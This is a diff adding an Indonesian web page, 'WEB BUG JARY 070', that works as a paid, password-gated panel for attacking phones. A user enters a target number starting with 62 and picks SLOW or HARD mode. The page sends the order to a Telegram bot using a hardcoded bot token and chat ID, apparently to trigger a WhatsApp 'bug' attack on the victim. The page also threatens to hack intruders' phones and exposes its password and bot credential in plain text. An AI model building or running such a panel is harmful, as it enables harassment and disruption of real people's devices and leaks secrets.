@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>WEB BUG JARY 070</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      color: white;
+    }
+
+    /* Background login & halaman utama */
+    .login-screen, body.main {
+      background: url('https://files.catbox.moe/aa5j7h.jpg') no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    .login-screen {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .login-box {
+      background: rgba(0, 0, 0, 0.75);
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px #a955ff;
+      max-width: 300px;
+      width: 90%;
+    }
+
+    .login-box h2 {
+      font-size: 14px;
+      margin-bottom: 15px;
+      text-shadow: 1px 1px black;
+    }
+
+    .login-box input {
+      padding: 8px;
+      width: 90%;
+      font-size: 12px;
+      border-radius: 6px;
+      border: none;
+      margin-bottom: 12px;
+      background-color: #2c0059;
+      color: white;
+    }
+
+    .login-box button {
+      padding: 8px 15px;
+      background-color: #9b30ff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-box .owner-link {
+      display: inline-block;
+      margin-top: 12px;
+      text-decoration: none;
+      background: #ff0077;
+      color: white;
+      padding: 7px 15px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: bold;
+    }
+
+    .note {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 8px;
+      border-radius: 8px;
+      margin: 15px;
+      font-size: 11px;
+      color: #ff4444;
+      font-weight: bold;
+    }
+
+    .profile-img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 3px solid #fff;
+      margin-top: 5px;
+    }
+
+    h2 {
+      font-size: 14px;
+      margin: 10px 0;
+      text-shadow: 1px 1px #000;
+    }
+
+    input {
+      padding: 7px;
+      width: 85%;
+      max-width: 250px;
+      font-size: 11px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: none;
+      background-color: #2c0059;
+      color: white;
+    }
+
+    .btn {
+      padding: 8px 15px;
+      margin: 5px;
+      font-size: 11px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .slow { background-color: #4caf50; color: white; }
+    .hard { background-color: #f44336; color: white; }
+
+    #status {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #00ff00;
+      display: none;
+      font-weight: bold;
+    }
+
+    #info-jeda {
+      margin-top: 10px;
+      font-size: 11px;
+      color: yellow;
+      font-weight: bold;
+      display: none;
+      text-shadow: 1px 1px black;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 9px;
+      color: #ffffff88;
+      text-shadow: 1px 1px #000;
+    }
+
+    .section {
+      margin-top: 20px;
+    }
+
+    .section h3 {
+      margin-bottom: 5px;
+      font-size: 11px;
+      color: #fff;
+      text-shadow: 1px 1px #000;
+    }
+
+    .sosmed-buttons {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 5px;
+    }
+
+    .purple-btn {
+      background-color: #9b30ff;
+      color: white;
+      text-decoration: none;
+      padding: 8px 14px;
+      font-size: 11px;
+      font-weight: bold;
+      border-radius: 6px;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+
+<!-- LOGIN SCREEN -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h2>MASUKAN PASSWORD YANG DI BERIKAN JARY070</h2>
+    <input type="password" id="passwordInput" placeholder="Password">
+    <br>
+    <button onclick="checkPassword()">MASUK</button>
+    <br>
+    <a class="owner-link" href="https://t.me/JaryIsHereu" target="_blank">BUY AKSES CHAT OWNER</a>
+  </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div id="mainContent" style="display: none;">
+  <div class="note">
+    NOTE: JIKA LU BERUSAHA MASUK TANPA SEPENGATAHUAN JARY<br>
+    GW SUMPAHIN HP LU BAKAL GW RETAS!!!
+  </div>
+
+  <img src="https://files.catbox.moe/3q1hry.jpg" class="profile-img" alt="Profil Jary">
+  <h2>WEB BUG JARY 070</h2>
+
+  <input type="text" id="target" placeholder="MASUKAN NO TARGET AWALAN 62XXX" />
+
+  <div>
+    <button class="btn slow" onclick="kirim('SLOW')">SLOW</button>
+    <button class="btn hard" onclick="kirim('HARD')">HARD</button>
+  </div>
+
+  <div id="status">✅ Berhasil dikirim ke bot Telegram!</div>
+  <div id="info-jeda">⚠️ BUG BERHASIL DIKIRIM - INGAT JEDA 5 MNIT ⚠️</div>
+
+  <div class="section">
+    <h3>CONTACT DEV</h3>
+    <div class="sosmed-buttons">
+      <a class="purple-btn" href="https://t.me/JaryIsHereu" target="_blank">OWNER</a>
+    </div>
+  </div>
+
+  <div class="section">
+    <h3>FOLLOW SOSIAL MEDIA DEV UNTUK BERITA SELANJUTNYA</h3>
+    <div class="sosmed-buttons">
+      <a class="purple-btn" href="https://www.tiktok.com/@anjay457..1?_t=ZS-8yFCEwejxqh&_r=1" target="_blank">TIKTOK</a>
+    </div>
+  </div>
+
+  <div class="section">
+    <h3>CHANEL WHATSSAP SEV</h3>
+    <div class="sosmed-buttons">
+      <a class="purple-btn" href="https://whatsapp.com/channel/0029VbAjxQRCcW4sAURkYL21" target="_blank">CH</a>
+    </div>
+  </div>
+
+  <div class="footer">Created By Jary070</div>
+</div>
+
+<script>
+  function checkPassword() {
+    const input = document.getElementById("passwordInput").value;
+    if (input === "JARYDEVELOPER") {
+      document.getElementById("loginScreen").style.display = "none";
+      document.body.classList.add('main');
+      document.getElementById("mainContent").style.display = "block";
+    } else {
+      alert("❌ Password salah!");
+    }
+  }
+
+  async function kirim(mode) {
+    const target = document.getElementById('target').value;
+    const status = document.getElementById('status');
+    const info = document.getElementById('info-jeda');
+    const btnSlow = document.querySelector(".btn.slow");
+    const btnHard = document.querySelector(".btn.hard");
+
+    if (!target || !target.startsWith("62")) {
+      alert("Masukkan nomor yang valid (awalan 62)");
+      return;
+    }
+
+    btnSlow.disabled = true;
+    btnHard.disabled = true;
+    btnSlow.style.opacity = 0.5;
+    btnHard.style.opacity = 0.5;
+
+    const message = `${mode} ${target}`;
+    const botToken = "7477722076:AAEU0iVd2Hxn6C4ipUwrN1LZKW7NYThwSiQ";
+    const chatId = "6173091470";
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    const response = await fetch(url, {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
+    if (response.ok) {
+      status.style.display = 'block';
+      info.style.display = 'block';
+    } else {
+      alert("❌ Gagal mengirim pesan ke Telegram.");
+    }
+
+    setTimeout(() => {
+      btnSlow.disabled = false;
+      btnHard.disabled = false;
+      btnSlow.style.opacity = 1;
+      btnHard.style.opacity = 1;
+      info.style.display = 'none';
+    }, 300000);
+  }
+</script>
+
+</body>
+</html>
